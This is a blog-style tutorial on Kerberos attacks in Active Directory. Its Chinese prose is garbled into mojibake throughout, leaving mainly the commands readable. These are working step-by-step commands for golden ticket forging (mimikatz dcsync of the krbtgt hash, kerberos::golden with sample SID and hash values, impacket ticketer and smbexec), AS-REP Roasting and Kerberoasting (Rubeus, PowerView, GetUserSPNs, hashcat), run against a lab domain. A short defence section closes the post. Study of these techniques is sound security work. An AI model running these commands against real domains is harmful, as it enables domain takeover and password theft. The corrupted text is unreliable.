<h2 id="AS-REPé˜¶æ®µäº§ç”Ÿçš„æ”»å‡»æ–¹å¼"><a href="#AS-REPé˜¶æ®µäº§ç”Ÿçš„æ”»å‡»æ–¹å¼" class="headerlink" title="AS-REPé˜¶æ®µäº§ç”Ÿçš„æ”»å‡»æ–¹å¼"></a>AS-REPé˜¶æ®µäº§ç”Ÿçš„æ”»å‡»æ–¹å¼</h2><h3 id="1-é»„é‡‘ç¥¨æ®"><a href="#1-é»„é‡‘ç¥¨æ®" class="headerlink" title="1.é»„é‡‘ç¥¨æ®"></a>1.é»„é‡‘ç¥¨æ®</h3><p>åœ¨ AS-REP é˜¶æ®µï¼Œç”±äºè¿”å›çš„ TGT è®¤è´­æƒè¯æ˜¯ç”± krbtgt ç”¨æˆ·çš„å¯†ç HashåŠ å¯†çš„ï¼Œå› æ­¤å¦‚æœæˆ‘ä»¬æ‹¥æœ‰ krbtgt çš„ hash å°±å¯ä»¥è‡ªå·±åˆ¶ä½œä¸€ä¸ªTGTè®¤è´­æƒè¯ï¼Œè¿™å°±é€ æˆäº†é»„é‡‘ç¥¨æ®æ”»å‡»</p>
<p>ä¼ªé€ é»„é‡‘ç¥¨æ®çš„å‰æï¼š</p>
<ul>
<li><p>è¦ä¼ªé€ çš„åŸŸç”¨æˆ·(è¿™é‡Œæˆ‘ä»¬ä¸€èˆ¬å¡«å†™åŸŸç®¡ç†å‘˜è´¦æˆ·)</p>
</li>
<li><p>åŸŸå</p>
</li>
<li><p>åŸŸçš„SIDå€¼(å°±æ˜¯åŸŸæˆå‘˜SIDå€¼å»æ‰æœ€åçš„)</p>
</li>
<li><p>krbtgtè´¦å·çš„å“ˆå¸Œå€¼æˆ–AES-256å€¼</p>
</li>
</ul>
<p><strong>1.ä½¿ç”¨mimikatz</strong></p>
<p>å…ˆè·å–krbtgt hashï¼š</p>
<p>åœ¨åŸŸæ§æ‰§è¡Œ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;lsadump::dcsync /domain:0day.org /user:krbtgt&quot;</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°å¦‚ä¸‹ä¿¡æ¯ï¼š</p>
<p>sidï¼šS-1-5-21-1812960810-2335050734-3517558805</p>
<p>ntlm hashï¼š36f9d9e6d98ecf8307baf4f46ef842a2</p>
<p>aes256ï¼šdbc55f9f925de5a482d3bf5ede7d0d46d4b121c01bdd9d06be4aed367212d3f9</p>
<p>ä¼ªé€ ç”¨æˆ·administratoræ‰§è¡Œ(aes256)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mimikatz &quot;kerberos::golden /domain:0day.org /sid:S-1-5-21-1812960810-2335050734-3517558805</span><br><span class="line">/aes256:dbc55f9f925de5a482d3bf5ede7d0d46d4b121c01bdd9d06be4aed367212d3f9 /user:administrator</span><br><span class="line">/ticket:gold.kirbi&quot;</span><br></pre></td></tr></table></figure>

<p>ä¼ªé€ ç”¨æˆ·administratoræ‰§è¡Œ(krbtgt hash)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz &quot;kerberos::golden /domain:0day.org /sid:S-1-5-21-1812960810-2335050734-3517558805</span><br><span class="line">/krbtgt:36f9d9e6d98ecf8307baf4f46ef842a2 /user:administrator /ticket:gold.kirbi&quot;</span><br></pre></td></tr></table></figure>

<p>ç”Ÿæˆæ–‡ä»¶gold.kirbi</p>
<p>å¯¼å…¥Golden Ticketï¼Œæ‰§è¡Œå‘½ä»¤ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt C:\Users\jack.0DAY\Desktop\gold.kirbi</span><br></pre></td></tr></table></figure>

<p>è·å¾—åŸŸæ§æƒé™</p>
<p><img src="https://i.bmp.ovh/imgs/2021/10/524193ce037eecda.png"></p>
<p><strong>æ³¨æ„è¿™é‡Œæ ¼å¼åªèƒ½æ˜¯ ä¸»æœºå.åŸŸå çš„å½¢å¼ï¼Œè€Œä¸èƒ½å†™ip</strong></p>
<p><strong>2.ä½¿ç”¨impacket</strong></p>
<p>è¿™é‡Œä½¿ç”¨kaliï¼Œä¸åœ¨åŸŸå†…åªéœ€è¦æŠŠdnsæ”¹ä¸ºåŸŸæ§å³å¯</p>
<p><img src="https://i.bmp.ovh/imgs/2021/10/a2e6129a5604fa0f.png"></p>
<p>å…ˆç”Ÿæˆç¥¨æ®administrator.ccache</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ticketer.py -domain-sid S-1-5-21-1812960810-2335050734-3517558805 -nthash 36f9d9e6d98ecf8307baf4f46ef842a2 -domain 0day.org administrator</span><br></pre></td></tr></table></figure>



<p>å¯¼å…¥ç¥¨æ®</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export KRB5CCNAME=administrator.ccache</span><br></pre></td></tr></table></figure>

<p>ç„¶ååœ¨è®¿é—®åŸŸæ§</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 smbexec.py -no-pass -k OWA2010SP3.0day.org</span><br></pre></td></tr></table></figure>

<p><img src="https://i.bmp.ovh/imgs/2021/10/8d6034ac90a7ac68.png"></p>
<h3 id="2-AS-REP-Roasting"><a href="#2-AS-REP-Roasting" class="headerlink" title="2.AS-REP Roasting"></a>2.AS-REP Roasting</h3><p>åœ¨AS-REPé˜¶æ®µï¼Œæœ€å¤–å±‚çš„ enc-part æ˜¯ç”¨ç”¨æˆ·å¯†ç  Hash åŠ å¯†çš„ã€‚å¯¹äºåŸŸç”¨æˆ·ï¼Œå¦‚æœè®¾ç½®äº†é€‰é¡¹â€ Do not require Kerberos preauthenticationâ€ï¼Œæ­¤æ—¶å‘åŸŸæ§åˆ¶å™¨çš„ 88 ç«¯å£å‘é€ AS_REQ è¯·æ±‚ï¼Œå¯¹æ”¶åˆ°çš„AS_REPå†…å®¹(enc-partåº•ä¸‹çš„ciperï¼Œå› ä¸ºè¿™éƒ¨åˆ†æ˜¯ä½¿ç”¨ç”¨æˆ· hash åŠ å¯†çš„ Login Session Keyï¼Œæˆ‘ä»¬é€šè¿‡è¿›è¡Œç¦»çº¿çˆ†ç ´å°±å¯ä»¥è·å¾—ç”¨æˆ·hash)é‡æ–°ç»„åˆï¼Œèƒ½å¤Ÿæ‹¼æ¥æˆâ€Kerberos 5 AS-REP etype 23â€(18200)çš„æ ¼å¼ï¼Œæ¥ä¸‹æ¥å¯ä»¥ä½¿ç”¨hashcatå¯¹å…¶ç ´è§£ï¼Œæœ€ç»ˆè·å¾—è¯¥ç”¨æˆ·çš„æ˜æ–‡å£ä»¤ï¼Œè¿™å°±é€ æˆäº† AS-REP Roastingæ”»å‡»ã€‚</p>
<p><img src="https://i.bmp.ovh/imgs/2021/10/7e0ab0fc431debdf.png"></p>
<p>é»˜è®¤è¿™ä¸ªåŠŸèƒ½æ˜¯ä¸å¯ç”¨çš„ï¼Œå¦‚æœå¯ç”¨AS-REPä¼šè¿”å›ç”¨æˆ·hashåŠ å¯†çš„sessionkey-asï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ç”¨johnç¦»çº¿ç ´è§£</p>
<p><img src="https://i.bmp.ovh/imgs/2021/10/8d064497a3dc6983.png"></p>
<p>ä½¿ç”¨Empireä¸‹çš„powerview.ps1æŸ¥æ‰¾åŸŸä¸­è®¾ç½®äº† â€œä¸éœ€è¦kerberosé¢„èº«ä»½éªŒè¯â€ çš„ç”¨æˆ·</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\powerview.ps1</span><br><span class="line"> Get-DomainUser -PreauthNotRequired</span><br></pre></td></tr></table></figure>

<p><img src="https://i.bmp.ovh/imgs/2021/10/b8e837d21b3bae34.png"></p>
<p>ä½¿ç”¨ASREPRoast.ps1è·å–AS-REPè¿”å›çš„Hash</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\ASREPRoast.ps1</span><br><span class="line">Get-ASREPHash -UserName jack -Domain 0day.org | Out-File -Encoding ASCII hash.txt</span><br></pre></td></tr></table></figure>

<p><img src="https://i.bmp.ovh/imgs/2021/10/6ea757bc36cb287f.png"></p>
<p>ä¿®æ”¹ä¸ºhashcatèƒ½è¯†åˆ«çš„æ ¼å¼ï¼Œåœ¨$krb5asrepåé¢æ·»åŠ $23æ‹¼æ¥</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 18200 hash.txt pass.txt --force</span><br></pre></td></tr></table></figure>

<p><img src="https://i.bmp.ovh/imgs/2021/10/546bc32014e7885e.png"></p>
<h1 id="TGS-REQ"><a href="#TGS-REQ" class="headerlink" title="TGS-REQ"></a>TGS-REQ</h1><p>ç»è¿‡ä¸Šé¢çš„æ­¥éª¤ï¼Œå®¢æˆ·ç«¯è·å¾—äº† TGTè®¤è´­æƒè¯ å’Œ Login Session Keyã€‚ç„¶åç”¨è‡ªå·±çš„å¯†ç NTLM Hashè§£å¯†Login Session Keyå¾—åˆ° åŸå§‹çš„Logon Session Keyã€‚ç„¶åå®ƒä¼šåœ¨æœ¬åœ°ç¼“å­˜æ­¤ TGTè®¤è´­æƒè¯ å’Œ åŸå§‹çš„Login Session Keyã€‚å¦‚æœç°åœ¨å®ƒéœ€è¦è®¿é—®æŸå°æœåŠ¡å™¨çš„æŸä¸ªæœåŠ¡ï¼Œå®ƒå°±éœ€è¦å‡­å€Ÿè¿™å¼ TGTè®¤è´­å‡­è¯å‘KDCè´­ä¹°ç›¸åº”çš„å…¥åœºåˆ¸<strong>STæœåŠ¡ç¥¨æ®ï¼ˆService Ticketï¼‰ã€‚</strong>STæœåŠ¡ç¥¨æ®æ˜¯é€šè¿‡KDCçš„å¦ä¸€ä¸ªæœåŠ¡ <strong>TGSï¼ˆTicket Granting Serviceï¼‰</strong>å‡ºå”®çš„ã€‚åœ¨è¿™ä¸ªé˜¶æ®µï¼Œå¾®è½¯å¼•å…¥äº†ä¸¤ä¸ªæ‰©å±•è‡ªåè®® S4u2self å’Œ S4u2Proxy(å½“å§”æ´¾çš„æ—¶å€™ï¼Œæ‰ç”¨çš„åˆ°)</p>
<p>3ã€<strong>TGS-REQ</strong>ï¼šå®¢æˆ·ç«¯å‘KDCè´­ä¹°é’ˆå¯¹æŒ‡å®šæœåŠ¡çš„STæœåŠ¡ç¥¨æ®è¯·æ±‚ï¼Œè¯¥è¯·æ±‚ä¸»è¦åŒ…å«å¦‚ä¸‹çš„å†…å®¹ï¼š<strong>å®¢æˆ·ç«¯ä¿¡æ¯ã€Authenticator(Login Session KeyåŠ å¯†çš„æ—¶é—´æˆ³)ã€TGTè®¤è´­æƒè¯(padataä¸‹ap-reqä¸‹çš„ticket) å’Œ è®¿é—®çš„æœåŠ¡å</strong> ä»¥åŠä¸€äº›å…¶ä»–ä¿¡æ¯ ã€‚</p>
<p><img src="https://i.bmp.ovh/imgs/2021/10/ad2ffcab4db55ba5.png"></p>
<p><img src="https://i.bmp.ovh/imgs/2021/10/51995ef830c2e221.png"></p>
<h1 id="TGS-REP"><a href="#TGS-REP" class="headerlink" title="TGS-REP"></a>TGS-REP</h1><p>4.ã€TGS-REPï¼šTGSæ¥æ”¶åˆ°è¯·æ±‚ä¹‹åï¼Œé¦–å…ˆä¼šæ£€æŸ¥è‡ªèº«æ˜¯å¦å­˜åœ¨å®¢æˆ·ç«¯æ‰€è¯·æ±‚çš„æœåŠ¡ã€‚å¦‚æœæœåŠ¡å­˜åœ¨ï¼Œåˆ™é€šè¿‡ krbtgt ç”¨æˆ·çš„NTLM Hash è§£å¯†TGTå¹¶å¾—åˆ°Login Session Keyï¼Œç„¶åé€šè¿‡Login Session Keyè§£å¯†Authenticatorï¼Œå¦‚æœè§£å¯†æˆåŠŸï¼Œåˆ™éªŒè¯äº†å¯¹æ–¹çš„çœŸå®èº«ä»½ï¼ŒåŒæ—¶è¿˜ä¼šéªŒè¯æ—¶é—´æˆ³æ˜¯å¦åœ¨èŒƒå›´å†…ã€‚å¹¶ä¸”è¿˜ä¼šæ£€æŸ¥TGTä¸­çš„æ—¶é—´æˆ³æ˜¯å¦è¿‡æœŸï¼Œä¸”åŸå§‹åœ°å€æ˜¯å¦å’ŒTGTä¸­ä¿å­˜çš„åœ°å€ç›¸åŒã€‚åœ¨å®Œæˆä¸Šè¿°çš„æ£€æµ‹åï¼Œå¦‚æœéªŒè¯é€šè¿‡ï¼Œåˆ™TGSå®Œæˆäº†å¯¹å®¢æˆ·ç«¯çš„è®¤è¯ï¼Œä¼šç”Ÿæˆä¸€ä¸ªç”¨Logon Session KeyåŠ å¯†åçš„ç”¨äºç¡®ä¿å®¢æˆ·ç«¯-æœåŠ¡å™¨ä¹‹é—´é€šä¿¡å®‰å…¨çš„Service Session Keyä¼šè¯ç§˜é’¥(ä¹Ÿå°±æ˜¯æœ€å¤–å±‚enc-partéƒ¨åˆ†)ã€‚å¹¶ä¸”ä¼šä¸ºè¯¥å®¢æˆ·ç«¯ç”ŸæˆSTæœåŠ¡ç¥¨æ®ã€‚STæœåŠ¡ç¥¨æ®ä¸»è¦åŒ…å«ä¸¤æ–¹é¢çš„å†…å®¹ï¼šå®¢æˆ·ç«¯ç”¨æˆ·ä¿¡æ¯ å’Œ åŸå§‹Service Session Keyï¼Œæ•´ä¸ªSTæœåŠ¡ç¥¨æ®ç”¨è¯¥æœåŠ¡çš„NTLM Hashè¿›è¡ŒåŠ å¯†ã€‚æœ€ç»ˆService Session Key å’Œ STæœåŠ¡ç¥¨æ® å‘é€ç»™å®¢æˆ·ç«¯ã€‚(è¿™ä¸€æ­¥ä¸ç®¡ç”¨æˆ·æœ‰æ²¡æœ‰è®¿é—®æœåŠ¡çš„æƒé™ï¼Œåªè¦TGTæ­£ç¡®ï¼Œå°±éƒ½ä¼šè¿”å›STæœåŠ¡ç¥¨æ®ï¼Œè¿™ä¹Ÿæ˜¯kerberoastingèƒ½åˆ©ç”¨çš„åŸå› ï¼Œä»»ä½•ä¸€ä¸ªç”¨æˆ·ï¼Œåªè¦hashæ­£ç¡®ï¼Œå°±å¯ä»¥è¯·æ±‚åŸŸå†…ä»»ä½•ä¸€ä¸ªæœåŠ¡çš„STç¥¨æ®)</p>
<p><img src="https://i.bmp.ovh/imgs/2021/10/9d627cd1f134b5d0.png"></p>
<p>enc-partï¼šè¿™éƒ¨åˆ†æ˜¯ç”¨è¯·æ±‚æœåŠ¡çš„å¯†ç HashåŠ å¯†çš„ã€‚å› æ­¤å¦‚æœæˆ‘ä»¬æ‹¥æœ‰æœåŠ¡çš„å¯†ç Hashï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥è‡ªå·±åˆ¶ä½œä¸€ä¸ªSTæœåŠ¡ç¥¨æ®ï¼Œè¿™å°±é€ æˆäº†ç™½é“¶ç¥¨æ®æ”»å‡»ã€‚ä¹Ÿæ­£å› ä¸ºè¯¥ç¥¨æ®æ˜¯ç”¨è¯·æ±‚æœåŠ¡çš„å¯†ç HashåŠ å¯†çš„ï¼Œæ‰€ä»¥å½“æˆ‘ä»¬å¾—åˆ°äº†STæœåŠ¡ç¥¨æ®ï¼Œå¯ä»¥å°è¯•çˆ†ç ´enc_partï¼Œæ¥å¾—åˆ°æœåŠ¡çš„å¯†ç Hashã€‚è¿™ä¹Ÿå°±é€ æˆäº†kerberoastæ”»å‡»</p>
<h2 id="TGS-REPé˜¶æ®µäº§ç”Ÿçš„æ”»å‡»æ–¹å¼"><a href="#TGS-REPé˜¶æ®µäº§ç”Ÿçš„æ”»å‡»æ–¹å¼" class="headerlink" title="TGS-REPé˜¶æ®µäº§ç”Ÿçš„æ”»å‡»æ–¹å¼"></a>TGS-REPé˜¶æ®µäº§ç”Ÿçš„æ”»å‡»æ–¹å¼</h2><h3 id="1-Kerberoastæ”»å‡»"><a href="#1-Kerberoastæ”»å‡»" class="headerlink" title="1.Kerberoastæ”»å‡»"></a>1.Kerberoastæ”»å‡»</h3><p>Kerberoastæ”»å‡»è¿‡ç¨‹ï¼š</p>
<p>1.æ”»å‡»è€…å¯¹ä¸€ä¸ªåŸŸè¿›è¡Œèº«ä»½éªŒè¯ï¼Œç„¶åä»åŸŸæ§åˆ¶å™¨è·å¾—ä¸€ä¸ªTGTè®¤è´­æƒè¯ ï¼Œè¯¥TGTè®¤è´­æƒè¯ç”¨äºä»¥åçš„STæœåŠ¡ç¥¨æ®è¯·æ±‚</p>
<p>2.æ”»å‡»è€…ä½¿ç”¨ä»–ä»¬çš„ TGTè®¤è´­æƒè¯ å‘å‡ºSTæœåŠ¡ç¥¨æ®è¯·æ±‚(TGS-REQ) è·å–ç‰¹å®šå½¢å¼ï¼ˆname/hostï¼‰çš„ servicePrincipalName (SPN)ã€‚ä¾‹å¦‚ï¼šMSSqlSvc/SQL.domain.comã€‚æ­¤SPNåœ¨åŸŸä¸­åº”è¯¥æ˜¯å”¯ä¸€çš„ï¼Œå¹¶ä¸”åœ¨ç”¨æˆ·æˆ–è®¡ç®—æœºå¸æˆ·çš„servicePrincipalName å­—æ®µä¸­æ³¨å†Œã€‚ åœ¨æœåŠ¡ç¥¨è¯è¯·æ±‚(TGS-REQ)è¿‡ç¨‹ä¸­ï¼Œæ”»å‡»è€…å¯ä»¥æŒ‡å®šå®ƒä»¬æ”¯æŒçš„KerberosåŠ å¯†ç±»å‹(RC4_HMACï¼ŒAES256_CTS_HMAC_SHA1_96ç­‰ç­‰)ã€‚</p>
<p>3.å¦‚æœæ”»å‡»è€…çš„ TGT æ˜¯æœ‰æ•ˆçš„ï¼Œåˆ™ DC å°†ä»TGTè®¤è´­æƒè¯ ä¸­æå–ä¿¡æ¯å¹¶å¡«å……åˆ°STæœåŠ¡ç¥¨æ®ä¸­ã€‚ ç„¶åï¼ŒåŸŸæ§åˆ¶å™¨æŸ¥æ‰¾å“ªä¸ªå¸æˆ·åœ¨ ServicedPrincipalName å­—æ®µä¸­æ³¨å†Œäº†æ‰€è¯·æ±‚çš„ SPNã€‚ STæœåŠ¡ç¥¨æ®ä½¿ç”¨æ³¨å†Œäº†æ‰€è¦æ±‚çš„ SPN çš„å¸æˆ·çš„NTLMå“ˆå¸Œè¿›è¡ŒåŠ å¯†, å¹¶ä½¿ç”¨æ”»å‡»è€…å’ŒæœåŠ¡å¸æˆ·å…±åŒå•†å®šçš„åŠ å¯†ç®—æ³•ã€‚ STæœåŠ¡ç¥¨æ®ä»¥æœåŠ¡ç¥¨æ®å›å¤(TGS-REP)çš„å½¢å¼å‘é€å›æ”»å‡»è€…ã€‚</p>
<p>4.æ”»å‡»è€…ä» TGS-REP ä¸­æå–åŠ å¯†çš„æœåŠ¡ç¥¨è¯ã€‚ ç”±äºæœåŠ¡ç¥¨è¯æ˜¯ç”¨é“¾æ¥åˆ°è¯·æ±‚ SPN çš„å¸æˆ·çš„å“ˆå¸ŒåŠ å¯†çš„ï¼Œæ‰€ä»¥æ”»å‡»è€…å¯ä»¥ç¦»çº¿ç ´è§£è¿™ä¸ªåŠ å¯†å—ï¼Œæ¢å¤å¸æˆ·çš„æ˜æ–‡å¯†ç ã€‚</p>
<p><strong>é¦–å…ˆæ˜¯è¯·æ±‚æœåŠ¡ç¥¨æ®</strong></p>
<p>1.Rubeus.exeè¯·æ±‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe kerberoast</span><br></pre></td></tr></table></figure>

<p>Rubeusé‡Œé¢çš„kerberoastæ”¯æŒå¯¹æ‰€æœ‰ç”¨æˆ·æˆ–è€…ç‰¹å®šç”¨æˆ·æ‰§è¡Œkerberoastingæ“ä½œï¼Œå…¶åŸç†åœ¨äºå…ˆç”¨LDAPæŸ¥è¯¢äºå†…çš„spnï¼Œå†é€šè¿‡å‘é€TGSåŒ…ï¼Œç„¶åç›´æ¥æ‰“å°å‡ºèƒ½ä½¿ç”¨ hashcat æˆ– john çˆ†ç ´çš„Hashã€‚ ä»¥ä¸‹çš„å‘½ä»¤ä¼šæ‰“å°å‡ºæ³¨å†Œäºç”¨æˆ·ä¸‹çš„æ‰€æœ‰SPNçš„æœåŠ¡ç¥¨æ®çš„hashcatæ ¼å¼ã€‚</p>
<p><img src="https://i.bmp.ovh/imgs/2021/10/858eaba8b2f0962e.png"></p>
<p>2.powershellè¯·æ±‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#è¯·æ±‚æœåŠ¡ç¥¨æ®</span><br><span class="line">Add-Type -AssemblyName System.IdentityModel</span><br><span class="line">New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;MSSQLSvc/Srv-DB-0day.0day.org:1433&quot;</span><br><span class="line">#åˆ—å‡ºæœåŠ¡ç¥¨æ®</span><br><span class="line">klist</span><br></pre></td></tr></table></figure>

<p><img src="https://i.bmp.ovh/imgs/2021/10/b8b09866625fa46c.png"></p>
<p>3.mimikatzè¯·æ±‚</p>
<p>è¯·æ±‚æŒ‡å®šSPNçš„æœåŠ¡ç¥¨æ®</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#è¯·æ±‚æœåŠ¡ç¥¨æ®</span><br><span class="line">kerberos::ask /target:MSSQLSvc/Srv-DB-0day.0day.org:1433 </span><br><span class="line">#åˆ—å‡ºæœåŠ¡ç¥¨æ®</span><br><span class="line">kerberos::list  </span><br><span class="line">#æ¸…é™¤æ‰€æœ‰ç¥¨æ®</span><br><span class="line">kerberos::purge</span><br></pre></td></tr></table></figure>

<p>4.Impacketä¸­çš„GetUserSPNS.pyè¯·æ±‚</p>
<p>è¯¥è„šæœ¬å¯ä»¥è¯·æ±‚æ³¨å†Œäºç”¨æˆ·ä¸‹çš„æ‰€æœ‰SPNçš„æœåŠ¡ç¥¨æ®ã€‚ä½¿ç”¨è¯¥è„šæœ¬éœ€è¦æä¾›åŸŸè´¦å·å¯†ç æ‰èƒ½æŸ¥è¯¢ã€‚è¯¥è„šæœ¬ç›´æ¥è¾“å‡ºhashcatæ ¼å¼çš„æœåŠ¡ç¥¨æ®ï¼Œå¯ç”¨hashcatç›´æ¥çˆ†ç ´ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 GetUserSPNs.py -request -dc-ip 192.168.200.143 0day.org/jack</span><br></pre></td></tr></table></figure>

<p><img src="https://i.bmp.ovh/imgs/2021/10/edb14e7b7bd115e5.png"></p>
<p>è¿™é‡Œè¾“å…¥jackçš„å¯†ç </p>
<p><strong>å¯¼å‡ºç¥¨æ®</strong></p>
<p>é¦–å…ˆæ˜¯æŸ¥çœ‹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">klist</span><br><span class="line">æˆ–</span><br><span class="line">mimikatz.exe &quot;kerberos::list&quot;</span><br><span class="line"> </span><br><span class="line">MSFé‡Œé¢</span><br><span class="line">load kiwi</span><br><span class="line">kerberos_ticket_list</span><br><span class="line">æˆ–</span><br><span class="line">load kiwi</span><br><span class="line">kiwi_cmd kerberos::list</span><br></pre></td></tr></table></figure>

<p>1.mimikatzå¯¼å‡º</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::list /export&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>

<p>æ‰§è¡Œå®Œåï¼Œä¼šåœ¨mimikatzåŒç›®å½•ä¸‹å¯¼å‡º åç¼€ä¸ºkirbiçš„ç¥¨æ®æ–‡ä»¶</p>
<p><img src="https://i.bmp.ovh/imgs/2021/10/d07b5513c834a18c.png"></p>
<p>2.Empireä¸‹çš„Invoke-Kerberoast.ps1</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\Invoke-Kerberoast.ps1;Invoke-Kerberoast -outputFormat Hashcat</span><br></pre></td></tr></table></figure>

<p><img src="https://i.bmp.ovh/imgs/2021/10/924bc6855dd30cdd.png"></p>
<p><strong>ç¦»çº¿ç ´è§£æœåŠ¡ç¥¨æ®</strong></p>
<p>1.kerberoastä¸­çš„tgsrepcrack.py</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 tgsrepcrack.py password.txt xx.kirbi</span><br></pre></td></tr></table></figure>

<p><img src="https://i.bmp.ovh/imgs/2021/10/7a09c1c9566ffade.png"></p>
<p>2.hashcat</p>
<p>å°†å¯¼å‡ºçš„hashcatæ ¼å¼çš„å“ˆå¸Œä¿å­˜ä¸ºhash.txtæ–‡ä»¶ï¼Œæ”¾åˆ°hashcatçš„ç›®å½•ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m  13100  hash.txt  pass.txt</span><br></pre></td></tr></table></figure>

<p><strong>Kerberoastæ”»å‡»é˜²èŒƒ</strong></p>
<p>ç¡®ä¿æœåŠ¡è´¦å·å¯†ç ä¸ºå¼ºå¯†ç (é•¿åº¦ã€éšæœºæ€§ã€å®šæœŸä¿®æ”¹)</p>
<p>å¦‚æœæ”»å‡»è€…æ— æ³•å°†é»˜è®¤çš„AES256_HMACåŠ å¯†æ–¹å¼æ”¹ä¸ºRC4_HMAC_MD5ï¼Œå°±æ— æ³•å®éªŒ tgsrepcrack.pyæ¥ç ´è§£å¯†ç ã€‚</p>
<p>æ”»å‡»è€…å¯ä»¥é€šè¿‡å—…æ¢çš„æ–¹æ³•æŠ“å–Kerberos TGSç¥¨æ®ã€‚å› æ­¤ï¼Œå¦‚æœå¼ºåˆ¶å®éªŒAES256_HMACæ–¹å¼å¯¹Kerberosç¥¨æ®è¿›è¡ŒåŠ å¯†ï¼Œé‚£ä¹ˆï¼Œå³ä½¿æ”»å‡»è€…è·å–äº†Kerberosç¥¨æ®ï¼Œä¹Ÿæ— æ³•å°†å…¶ç ´è§£ï¼Œä»è€Œä¿è¯äº†æ´»åŠ¨ç›®å½•çš„å®‰å…¨æ€§ã€‚</p>
<p>è®¸å¤šæœåŠ¡è´¦æˆ·åœ¨å†…ç½‘ä¸­è¢«åˆ†é…äº†è¿‡é«˜çš„æƒé™ï¼Œä¸”å¯†ç å¼ºåº¦è¾ƒå·®ã€‚æ”»å‡»è€…å¾ˆå¯èƒ½é€šè¿‡ç ´è§£ç¥¨æ®çš„å¯†ç ï¼Œä»åŸŸç”¨æˆ·æƒé™æå‡åˆ°åŸŸç®¡ç†å‘˜æƒé™ã€‚å› æ­¤ï¼Œåº”è¯¥å¯¹æœåŠ¡è´¦æˆ·çš„æƒé™è¿›è¡Œé€‚å½“çš„é…ç½®ï¼Œå¹¶æé«˜å¯†ç çš„å¼ºåº¦ã€‚</p>
<p>åœ¨è¿›è¡Œæ—¥å¿—å®¡è®¡æ—¶ï¼Œå¯ä»¥é‡ç‚¹å…³æ³¨IDä¸º4679(è¯·æ±‚KerberosæœåŠ¡ç¥¨æ®)çš„æ—¶é—´ã€‚å¦‚æœæœ‰è¿‡å¤šçš„ 4769 æ—¥å¿—ï¼Œåº”è¿›ä¸€æ­¥æ£€æŸ¥ç³»ç»Ÿä¸­æ˜¯å¦å­˜åœ¨æ¶æ„è¡Œä¸ºã€‚</p>
